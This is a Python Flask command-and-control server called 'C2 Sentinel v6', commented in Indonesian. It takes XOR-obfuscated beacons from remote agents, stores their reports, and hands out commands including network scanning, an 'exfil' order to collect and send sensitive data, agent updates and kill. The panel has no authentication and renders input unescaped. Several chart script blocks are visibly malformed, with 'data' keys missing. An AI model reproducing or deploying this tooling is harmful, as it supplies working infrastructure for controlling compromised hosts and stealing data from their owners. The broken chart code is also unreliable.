from flask import Flask, request, jsonify, send_file, redirect, render_template_string
import json
import os
import base64
import threading
import time
from datetime import datetime, timedelta
import random

# === CONFIG ===
XOR_KEY = os.getenv("XOR_KEY", "sentinel")
REPORT_FILE = "data/reports.json"
COMMAND_EXPIRY = 300
TELEGRAM_ENABLED = False

# Auto-create folder
if not os.path.exists("data"):
    os.makedirs("data")

# Auto-create reports.json if not exists or corrupt
try:
    with open(REPORT_FILE, "r") as f:
        reports = json.load(f)
    if not isinstance(reports, list):
        raise ValueError("Not a list")
except:
    print("[!] reports.json tidak ada atau corrupt. Membuat baru...")
    with open(REPORT_FILE, "w") as f:
        json.dump([], f)

# === STORAGE ===
ACTIVE_COMMANDS = {}
AGENT_LAST_SEEN = {}
AGENT_STATUS = {}
AGENT_CHECKINS = []  # Simpan checkin per menit untuk grafik

# === UTILS ===
def xor_decrypt(data_b64, key=XOR_KEY):
    try:
        decoded = base64.b64decode(data_b64).decode()
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(decoded))
    except Exception as e:
        print(f"[XOR ERROR] {e}")
        return None

def is_high_severity(data):
    high_keywords = ["IDOR", "RCE", "SQLi", "XSS", "Auth Bypass", "SSRF", "LFI", "RFI"]
    issue = str(data.get("issue", "")).upper()
    return any(kw.upper() in issue for kw in high_keywords)

def send_alert(text):
    if not TELEGRAM_ENABLED:
        print("[TELEGRAM] Alert (nonaktif):", text)
        return
    pass

def cleanup_expired_commands():
    while True:
        now = datetime.now()
        expired = []
        for agent_id, cmd in ACTIVE_COMMANDS.items():
            cmd_time = datetime.fromisoformat(cmd["timestamp"])
            if (now - cmd_time).total_seconds() > COMMAND_EXPIRY:
                expired.append(agent_id)
        for agent_id in expired:
            del ACTIVE_COMMANDS[agent_id]
            print(f"[CLEANUP] Perintah untuk {agent_id} kedaluwarsa.")
        time.sleep(60)

threading.Thread(target=cleanup_expired_commands, daemon=True).start()

# === AI ANALYSIS ENGINE — FIXED! ===
def ai_analyze_reports(reports):
    """
    AI sederhana untuk analisis laporan — SELALU RETURN STRUKTUR LENGKAP.
    """
    try:
        total = len(reports)
        high_count = 0
        issue_types = {}
        targets = {}
        last_24h = 0
        now = datetime.now()

        if total > 0:
            for r in reports:
                if is_high_severity(r):
                    high_count += 1

                issue = r.get("issue", "Unknown")
                issue_types[issue] = issue_types.get(issue, 0) + 1

                target = r.get("target", "Unknown")
                targets[target] = targets.get(target, 0) + 1

                try:
                    ts = datetime.fromisoformat(r.get("timestamp", ""))
                    if (now - ts).total_seconds() < 86400:
                        last_24h += 1
                except:
                    pass

        if total == 0:
            summary = """📊 **AI INSIGHT REPORT**
========================
Belum ada data untuk dianalisis.

💡 Rekomendasi AI:
- Deploy lebih banyak agent.
- Pastikan agent bisa beacon ke server.
- Periksa koneksi jaringan dan C2 endpoint."""
            top_issue = "None"
            top_target = "None"
        else:
            top_issue = max(issue_types, key=issue_types.get) if issue_types else "None"
            top_target = max(targets, key=targets.get) if targets else "None"

            summary = f"""
📊 **AI INSIGHT REPORT**
========================
Total Laporan: {total}
High Severity: {high_count}
Laporan 24 Jam Terakhir: {last_24h}

🔥 Issue Terbanyak: {top_issue} ({issue_types.get(top_issue, 0)} laporan)
🎯 Target Terbanyak: {top_target}

💡 Rekomendasi AI:
- Fokuskan scan ke target '{top_target}'
- Prioritaskan mitigasi issue '{top_issue}'
- {random.choice([
    "Periksa konfigurasi auth di endpoint rentan.",
    "Lakukan fuzzing lebih dalam di path yang dilaporkan.",
    "Agent aktif stabil — pertahankan jadwal beacon.",
    "Tingkatkan frekuensi scan untuk deteksi lebih cepat."
])}
            """

        return {
            "summary": summary.strip(),
            "high_severity": high_count,
            "total": total,
            "last_24h": last_24h,
            "issue_types": issue_types,
            "targets": targets
        }

    except Exception as e:
        print(f"[AI ANALYSIS ERROR] {e}")
        return {
            "summary": "❌ Error dalam analisis AI. Periksa format laporan.",
            "high_severity": 0,
            "total": 0,
            "last_24h": 0,
            "issue_types": {},
            "targets": {}
        }

# === TRACK CHECKINS UNTUK GRAFIK ===
def track_agent_checkins():
    while True:
        now = datetime.now()
        minute_key = now.strftime("%H:%M")
        online_now = sum(1 for agent_id in AGENT_LAST_SEEN.keys()
                        if (now - AGENT_LAST_SEEN[agent_id]).total_seconds() < 300)
        AGENT_CHECKINS.append({"time": minute_key, "online": online_now})
        if len(AGENT_CHECKINS) > 60:
            AGENT_CHECKINS.pop(0)
        time.sleep(60)

threading.Thread(target=track_agent_checkins, daemon=True).start()

# === FLASK APP ===
app = Flask(__name__)

# === TEMPLATES ===
def get_dashboard_template():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>🛡️ C2 Sentinel v6 - AI INSIGHT + REALTIME</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        <style>
            body { background: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
            .container { max-width: 1200px; margin: auto; }
            h1, h2, h3 { color: #00ff99; }
            a { color: #00ccff; text-decoration: none; }
            a:hover { text-decoration: underline; }
            pre { background: #1a1a1a; padding: 15px; border-radius: 5px; overflow-x: auto; }
            .card { background: #1a1a1a; padding: 20px; margin: 15px 0; border-radius: 8px; border: 1px solid #00ff00; }
            .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
            .status-online { color: #00ff00; }
            .status-offline { color: #ff3333; }
            .blink { animation: blinker 1.5s linear infinite; }
            @keyframes blinker { 50% { opacity: 0.3; } }
            button { background: #003300; color: #00ff00; border: 1px solid #00ff00; padding: 8px 16px; cursor: pointer; }
            button:hover { background: #004400; }
            select, input { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; padding: 8px; }
            .header { border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
            .terminal { height: 400px; overflow-y: auto; background: #000; padding: 10px; }
            .ai-insight { background: #001a00; border-left: 4px solid #00ff00; padding: 15px; margin: 20px 0; }
            .chart-container { height: 300px; margin: 20px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🛡️ C2 SENTINEL v6 <span class="blink">[AI INSIGHT + REALTIME]</span></h1>
                <p>
                    <a href="/">🏠 Dashboard</a> |
                    <a href="/agents">👾 Agent Live</a> |
                    <a href="/command">🎯 Command Center</a> |
                    <a href="/reports">📁 Reports</a> |
                    <a href="/logs">📜 Live Logs</a> |
                    <a href="/analytics">🤖 AI Analytics</a>
                </p>
            </div>

            <!-- CONTENT -->
            {{ content | safe }}

            <footer style="margin-top: 50px; font-size: 0.8em; color: #555;">
                C2 Sentinel v6 - AI INSIGHT EDITION &copy; 2025 | <span class="status-{{ 'online' if agents_online > 0 else 'offline' }}">Agents: {{ agents_online }} Online</span>
            </footer>
        </div>

        <script>
            setInterval(() => {
                if(['/logs', '/agents', '/'].includes(window.location.pathname)) {
                    location.reload();
                }
            }, 5000);
        </script>
    </body>
    </html>
    '''

# === ROUTES ===
@app.route('/')
def home():
    now = datetime.now()
    online_count = 0
    for agent_id, last_seen in AGENT_LAST_SEEN.items():
        if (now - last_seen).total_seconds() < 300:
            AGENT_STATUS[agent_id] = "online"
            online_count += 1
        else:
            AGENT_STATUS[agent_id] = "offline"

    # Load & analyze reports
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if not isinstance(reports, list):
            raise ValueError("Invalid format")
    except:
        reports = []
        with open(REPORT_FILE, "w") as f:
            json.dump([], f)

    ai_insight = ai_analyze_reports(reports)

    # Prepare chart data
    chart_labels = [item["time"] for item in AGENT_CHECKINS]
    chart_data = [item["online"] for item in AGENT_CHECKINS]

    content = f'''
    <div class="ai-insight">
        <h3>🤖 AI INSIGHT — ANALISIS OTOMATIS</h3>
        <pre style="color:#00ff99; white-space: pre-wrap;">{ai_insight["summary"]}</pre>
    </div>

    <div class="grid">
        <div class="card">
            <h2>📊 Statistik Real-time</h2>
            <p>🟢 Agent Online: <b>{online_count}</b></p>
            <p>💾 Total Laporan: <b>{ai_insight["total"]}</b></p>
            <p>🚨 High Severity: <b>{ai_insight["high_severity"]}</b></p>
            <p>⏱️ Command Aktif: <b>{len(ACTIVE_COMMANDS)}</b></p>
        </div>
        <div class="card">
            <h2>🚀 Quick Actions</h2>
            <p><a href="/command"><button>🎯 Kirim Perintah</button></a></p>
            <p><a href="/agents"><button>👾 Lihat Agent Live</button></a></p>
            <p><a href="/analytics"><button>📈 Grafik & Analytics</button></a></p>
        </div>
    </div>

    <div class="card">
        <h2>📈 Grafik Agent Online (60 Menit Terakhir)</h2>
        <div class="chart-container">
            <canvas id="agentChart"></canvas>
        </div>
    </div>

    <div class="card">
        <h2>📡 Agent Terakhir Check-in</h2>
        <pre>
{chr(10).join([f"[{last_seen.strftime('%H:%M:%S')}] {agent_id} - {AGENT_STATUS.get(agent_id, 'unknown')}" for agent_id, last_seen in list(AGENT_LAST_SEEN.items())[-5:]]) or "Belum ada agent check-in."}
        </pre>
    </div>

    <script>
        const ctx = document.getElementById('agentChart').getContext('2d');
        new Chart(ctx, {{
            type: 'line',
             {{
                labels: {json.dumps(chart_labels)},
                datasets: [{{
                    label: 'Agent Online',
                     {json.dumps(chart_data)},
                    borderColor: '#00ff00',
                    backgroundColor: 'rgba(0, 255, 0, 0.1)',
                    tension: 0.4
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{
                        labels: {{
                            color: '#00ff00'
                        }}
                    }}
                }},
                scales: {{
                    x: {{
                        ticks: {{ color: '#00ff00' }}
                    }},
                    y: {{
                        beginAtZero: true,
                        ticks: {{ color: '#00ff00' }}
                    }}
                }}
            }}
        }});
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=online_count)

@app.route('/analytics')
def analytics():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if not isinstance(reports, list):
            reports = []
    except:
        reports = []

    ai_insight = ai_analyze_reports(reports)

    issue_labels = list(ai_insight["issue_types"].keys())
    issue_data = list(ai_insight["issue_types"].values())

    target_labels = list(ai_insight["targets"].keys())[:10]
    target_data = list(ai_insight["targets"].values())[:10]

    chart_labels = [item["time"] for item in AGENT_CHECKINS]
    chart_data = [item["online"] for item in AGENT_CHECKINS]

    content = f'''
    <h2>📈 ANALYTICS & AI INSIGHT</h2>

    <div class="ai-insight">
        <h3>🤖 AI Executive Summary</h3>
        <pre style="color:#00ff99; white-space: pre-wrap;">{ai_insight["summary"]}</pre>
    </div>

    <div class="grid">
        <div class="card">
            <h3>📊 Issue Types Distribution</h3>
            <div class="chart-container">
                <canvas id="issueChart"></canvas>
            </div>
        </div>
        <div class="card">
            <h3>🎯 Top Targets</h3>
            <div class="chart-container">
                <canvas id="targetChart"></canvas>
            </div>
        </div>
    </div>

    <div class="card">
        <h3>📈 Agent Online Trend (60 Menit)</h3>
        <div class="chart-container">
            <canvas id="agentTrendChart"></canvas>
        </div>
    </div>

    <script>
        const issueCtx = document.getElementById('issueChart').getContext('2d');
        new Chart(issueCtx, {{
            type: 'bar',
             {{
                labels: {json.dumps(issue_labels)},
                datasets: [{{
                     {json.dumps(issue_data)},
                    backgroundColor: 'rgba(0, 255, 0, 0.5)',
                    borderColor: '#00ff00',
                    borderWidth: 1
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ labels: {{ color: '#00ff00' }} }}
                }},
                scales: {{
                    x: {{ ticks: {{ color: '#00ff00' }} }},
                    y: {{ beginAtZero: true, ticks: {{ color: '#00ff00' }} }}
                }}
            }}
        }});

        const targetCtx = document.getElementById('targetChart').getContext('2d');
        new Chart(targetCtx, {{
            type: 'pie',
             {{
                labels: {json.dumps(target_labels)},
                datasets: [{{
                     {json.dumps(target_data)},
                    backgroundColor: [
                        'rgba(0, 255, 0, 0.7)',
                        'rgba(0, 200, 0, 0.7)',
                        'rgba(0, 150, 0, 0.7)',
                        'rgba(0, 100, 0, 0.7)',
                        'rgba(0, 50, 0, 0.7)',
                        'rgba(0, 255, 50, 0.7)',
                        'rgba(0, 255, 100, 0.7)',
                        'rgba(0, 255, 150, 0.7)',
                        'rgba(0, 255, 200, 0.7)',
                        'rgba(0, 255, 255, 0.7)'
                    ]
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ labels: {{ color: '#00ff00' }} }}
                }}
            }}
        }});

        const trendCtx = document.getElementById('agentTrendChart').getContext('2d');
        new Chart(trendCtx, {{
            type: 'line',
             {{
                labels: {json.dumps(chart_labels)},
                datasets: [{{
                    label: 'Agent Online',
                    data: {json.dumps(chart_data)},
                    borderColor: '#00ff00',
                    backgroundColor: 'rgba(0, 255, 0, 0.1)',
                    tension: 0.3
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ labels: {{ color: '#00ff00' }} }}
                }},
                scales: {{
                    x: {{ ticks: {{ color: '#00ff00' }} }},
                    y: {{ beginAtZero: true, ticks: {{ color: '#00ff00' }} }}
                }}
            }}
        }});
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"))

# === Routes lainnya tetap sama (tidak diubah) ===
@app.route('/agents')
def agents_live():
    now = datetime.now()
    agents_html = ""
    for agent_id in AGENT_LAST_SEEN.keys():
        last_seen = AGENT_LAST_SEEN[agent_id]
        status = "online" if (now - last_seen).total_seconds() < 300 else "offline"
        AGENT_STATUS[agent_id] = status
        time_str = last_seen.strftime("%Y-%m-%d %H:%M:%S")
        agents_html += f'''
        <div style="border-bottom: 1px solid #333; padding: 10px;">
            <b>{agent_id}</b> 
            <span class="status-{status}">● {status.upper()}</span>
            <br><small>Terakhir: {time_str}</small>
            <br><a href="/command?agent_id={agent_id}"><button>Kirim Perintah</button></a>
        </div>
        '''

    content = f'''
    <h2>👾 AGENT LIVE STATUS</h2>
    <div style="background:#1a1a1a; padding:15px; border-radius:5px;">
        {agents_html if agents_html else "<i>Tidak ada agent terdaftar.</i>"}
    </div>
    <p><small>Auto-refresh tiap 5 detik...</small></p>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"))

@app.route('/command', methods=['GET', 'POST'])
def command_panel():
    if request.method == 'POST':
        agent_id = request.form.get('agent_id')
        cmd = request.form.get('cmd')
        note = request.form.get('note', '')
        if agent_id and cmd:
            ACTIVE_COMMANDS[agent_id] = {
                "cmd": cmd,
                "note": note,
                "timestamp": datetime.now().isoformat(),
                "issued_by": "admin"
            }
            return f'''
            <script>
                alert("✅ Perintah '{cmd}' terkirim ke {agent_id}!");
                window.location.href="/command";
            </script>
            '''

    prefill_id = request.args.get('agent_id', '')
    commands_html = ""
    for aid, cmd in ACTIVE_COMMANDS.items():
        issued = datetime.fromisoformat(cmd["timestamp"]).strftime("%H:%M:%S")
        commands_html += f"<li><b>{aid}</b>: <code>{cmd['cmd']}</code> ({issued}) <i>{cmd.get('note','')}</i></li>"

    content = f'''
    <h2>🎯 COMMAND CENTER</h2>
    <form method="post">
        <label>🆔 Agent ID:</label><br>
        <input type="text" name="agent_id" value="{prefill_id}" required style="width:100%; max-width:400px;"><br><br>
        
        <label>🕹️ Perintah:</label><br>
        <select name="cmd" style="width:100%; max-width:400px;">
            <option value="idle">🔄 idle - Tunggu perintah berikutnya</option>
            <option value="scan">🔍 scan - Lakukan network scan</option>
            <option value="exfil">📤 exfil - Kumpulkan & kirim data sensitif</option>
            <option value="update">🆙 update - Update agent ke versi terbaru</option>
            <option value="kill">💀 kill - Matikan agent secara permanen</option>
        </select><br><br>
        
        <label>📝 Catatan (Opsional):</label><br>
        <input type="text" name="note" placeholder="Contoh: scan subnet 192.168.1.0/24" style="width:100%; max-width:400px;"><br><br>
        
        <button type="submit">🚀 KIRIM PERINTAH</button>
    </form>
    
    <h3>📌 PERINTAH AKTIF (Auto-expire 5 menit)</h3>
    <ul>{commands_html if commands_html else "<i>Tidak ada perintah aktif.</i>"}</ul>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"))

@app.route('/reports')
def list_reports():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        reports.reverse()

        export_links = '''
        <p>
            <a href="/export?format=json"><button>💾 Export JSON</button></a>
            <a href="/export?format=csv"><button>📊 Export CSV</button></a>
        </p>
        '''

        content = f'''
        <h2>📁 LAPORAN AGENT</h2>
        {export_links}
        <div class="terminal" id="reportTerminal">
            <pre id="reportContent" style="color:#00ff00;">{json.dumps(reports[:50], indent=2, ensure_ascii=False) if reports else "Belum ada laporan."}</pre>
        </div>
        {export_links}
        '''
        return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"))
    except Exception as e:
        return f"<h2>❌ Error</h2><pre>{e}</pre>"

@app.route('/export')
def export_reports():
    fmt = request.args.get('format', 'json')
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if fmt == 'csv':
            import csv
            from io import StringIO
            output = StringIO()
            writer = csv.writer(output)
            if reports:
                writer.writerow(reports[0].keys())
                for r in reports:
                    writer.writerow(r.values())
            output.seek(0)
            return output.getvalue(), 200, {
                'Content-Type': 'text/csv',
                'Content-Disposition': 'attachment; filename=reports.csv'
            }
        else:
            return jsonify(reports)
    except Exception as e:
        return str(e), 500

@app.route('/logs')
def live_logs():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        reports.reverse()
        logs = []
        for r in reports[:100]:
            ts = r.get("timestamp", "N/A")
            agent = r.get("id", "unknown")
            issue = r.get("issue", "N/A")
            severity = "🔴 HIGH" if is_high_severity(r) else "⚪ LOW"
            logs.append(f"[{ts}] [{agent}] {severity} | {issue}")

        content = f'''
        <h2>📜 LIVE LOGS (Auto-refresh)</h2>
        <div class="terminal" id="logTerminal">
            <pre id="logContent" style="color:#00ff00;">
{chr(10).join(logs) if logs else "Belum ada log."}
            </pre>
        </div>
        <p><small>Auto-refresh tiap 5 detik...</small></p>
        '''
        return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"))
    except Exception as e:
        return str(e)

@app.route('/beacon', methods=['POST'])
def beacon():
    encrypted_data = request.form.get('data')
    if not encrypted_data:
        return "Invalid", 400

    decrypted = xor_decrypt(encrypted_data)
    if not decrypted:
        return "Forbidden", 403

    try:
        data = json.loads(decrypted)
        agent_id = data.get("id", "unknown")
        data["timestamp"] = datetime.now().isoformat()
        data["beacon_ip"] = request.remote_addr

        AGENT_LAST_SEEN[agent_id] = datetime.now()

        with open(REPORT_FILE, "r+") as f:
            try:
                reports = json.load(f)
                if not isinstance(reports, list):
                    reports = []
            except:
                reports = []
            reports.append(data)
            f.seek(0)
            json.dump(reports, f, indent=2, ensure_ascii=False)
            f.truncate()

        if is_high_severity(data):
            alert = f"🚨 <b>BUG KRITIS DITEMUKAN!</b>\n"
            alert += f"🆔 Agent: {agent_id}\n"
            alert += f"🎯 Target: {data.get('target', 'unknown')}\n"
            alert += f"🔧 Issue: {data.get('issue', 'unknown')}\n"
            alert += f"💰 Potensi Bounty: HIGH\n"
            alert += f"🕒 Waktu: {data['timestamp']}"
            send_alert(alert)

        cmd = ACTIVE_COMMANDS.get(agent_id, {"cmd": "idle"})
        if agent_id in ACTIVE_COMMANDS:
            del ACTIVE_COMMANDS[agent_id]

        return jsonify(cmd)

    except Exception as e:
        print(f"[BEACON ERROR] {e}")
        return "Error", 500

@app.route('/update', methods=['GET'])
def update():
    update_file = "agent_new.py"
    if not os.path.exists(update_file):
        with open(update_file, "w") as f:
            f.write('''print("✅ Agent updated to v2.0!")\n''')
    return send_file(update_file)

# === RUN ===
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8000))  # ← SUPPORT RAILWAY!
    print("🚀 C2 SENTINEL v6 - AI INSIGHT + REALTIME GRAPH")
    print(f"🌐 Running on http://0.0.0.0:{port}")
    print("🔐 XOR Key: 'sentinel'")
    print("📊 Buka browser dan akses dashboard!")
    app.run(host='0.0.0.0', port=port, debug=False)